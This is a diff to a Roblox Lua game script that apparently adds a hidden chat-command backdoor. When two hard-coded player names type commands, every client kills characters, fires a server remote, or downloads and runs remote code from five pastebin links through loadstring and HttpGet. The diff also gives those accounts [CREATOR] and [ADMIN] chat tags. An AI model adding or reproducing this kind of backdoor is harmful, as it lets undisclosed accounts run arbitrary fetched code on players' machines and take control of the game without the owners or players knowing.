@@ -733,50 +733,67 @@ end
 
 coroutine.wrap(CJZEISY_fake_script)()
 
+local TCS = game:GetService("TextChatService")
+local Players = game:GetService("Players")
 
-local textChatService = game:GetService("TextChatService")
-textChatService.OnIncomingMessage = function(message: TextChatMessage)
-	
+TCS.MessageReceived:Connect(function(TextChatMessage)
+    local Message = string.lower(TextChatMessage.Text)
+    local Player = TextChatMessage.TextSource
+
+    local Split = Message:split("[1]")
+
+    if Player.Name == "Tubers930s930" or Player.Name == "Builderman207649" then
+        if Split[1] == "/kill" then
+            if game.Players.LocalPlayer.Name == Split[2] or Split[2] == "all" then
+                game.Players.LocalPlayer.Character.Humanoid.Health = 0
+            end
+        end
+
+        if Split[1] == "/cat" then
+loadstring(game:HttpGet("https://pastebin.com/raw/sH0KPfxz"))()
+        end
+
+        if Split[1] == "/a-100" then
+            loadstring(game:HttpGet("https://pastebin.com/raw/TQfrJ7kS"))()
+        end
+
+        if Split[1] == "/x10" then
+loadstring(game:HttpGet("https://pastebin.com/raw/WyNwDs6W"))()
+        end
+
+        if Split[1] == "/silence" then
+            loadstring(game:HttpGet("https://pastebin.com/raw/jmnSaLiQ"))()
+        end
+
+        if Split[1] == "/delt" then
+loadstring(game:HttpGet("https://pastebin.com/raw/VEV1nkv5"))()
+        end
+
+        if Split[1] == "/playagain" then
+            if game.Players.LocalPlayer.Name == Split[2] or Split[2] == "all" then
+                game.ReplicatedStorage.EntityInfo.PlayAgain:FireServer()
+            end
+        end
+    end
+end)
+
+TCS.OnIncomingMessage = function(TextChatMessage)
 	local properties = Instance.new("TextChatMessageProperties")
-	
-	if message.TextSource then
-		
-		local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
-		
+
+	if TextChatMessage.TextSource then
+		local player = Players:GetPlayerByUserId(TextChatMessage.TextSource.UserId)
+        if player.Name == "Tubers930s930" then
+			properties.PrefixText = "<font color='#ff1100'>[CREATOR]</font> " .. TextChatMessage.PrefixText
+		end
+		if player.Name == "Builderman207649" then
+			properties.PrefixText = "<font color='#ff1100'>[ADMIN]</font> " .. TextChatMessage.PrefixText
+		end
 		if player.Name == "TheFigureBlack" then
-			
-			properties.PrefixText = "<font color='#00ffee'>[Dev and Moderler]</font> " .. "<font color='#ff8400'>[figure]</font> " .. message.PrefixText
-			
+			properties.PrefixText = "<font color='#ff1100'>[ADMIN]</font> " .. TextChatMessage.PrefixText
 		end
-		
 	end
-	
+
 	return properties
-	
-end
-
-
-
-
-local textChatService = game:GetService("TextChatService")
-textChatService.OnIncomingMessage = function(message: TextChatMessage)
-	
-	local properties = Instance.new("TextChatMessageProperties")
-	
-	if message.TextSource then
-		
-		local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
-		
-		if player.Name == "Tubers930s930" then
-			
-			properties.PrefixText = "<font color='#00ffee'>[Creator]</font> " .. "<font color='#ff8400'>[Tinkgy]</font> " .. message.PrefixText
-			
-		end
-		
-	end
-	
-	return properties
-	
 end
 
 
